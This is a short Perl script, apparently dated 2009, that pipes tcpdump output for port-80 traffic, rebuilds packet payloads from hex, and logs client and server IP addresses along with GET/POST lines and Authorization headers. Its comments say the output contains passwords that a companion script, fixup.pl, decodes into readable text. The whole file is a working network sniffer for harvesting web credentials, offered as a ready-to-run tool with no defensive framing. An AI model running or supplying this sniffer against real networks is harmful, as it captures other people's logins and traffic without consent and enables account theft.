#!/usr/bin/perl -w
# FILE: "G:\CODE\Perl\PARSE\tcpdump\sniffer.pl"
# LAST MODIFICATION: "Fri, 02 Oct 2009 15:06:30 Eastern Daylight Time"
# $Id:$

# USE WITH   fixup.pl
# Type ./sniffer.pl > results.out 
# This will record a maximum of 5000 Web accesses to the file results.out. 
# To record more or fewer accesses, provide sniffer.pl with a numeric argument. 
# The resulting file will contain IP addresses and UUencoded passwords. 
# To look up the hostnames and translate the passwords into human-readable text, run the output through fixup.pl. 

$LIMIT = shift || 5000;

$|=1;
open (STDIN,"/usr/sbin/tcpdump -lnx -s 1024 dst port 80 |");
while (<>) {
    if (/^\S/) {
	last unless $LIMIT--;
	while ($packet=~/(GET|POST|WWW-Authenticate|Authorization).+/g)  {
	    print "$client -> $host\t$&\n";
	}
	undef $client; undef $host; undef $packet;
	($client,$host) = /(\d+\.\d+\.\d+\.\d+).+ > (\d+\.\d+\.\d+\.\d+)/
	    if /P \d+:\d+\((\d+)\)/ && $1 > 0;
    }
    next unless $client && $host;
    s/\s+//;
    s/([0-9a-f]{2})\s?/chr(hex($1))/eg;
    tr/\x1F-\x7E\r\n//cd;
    $packet .= $_;
}
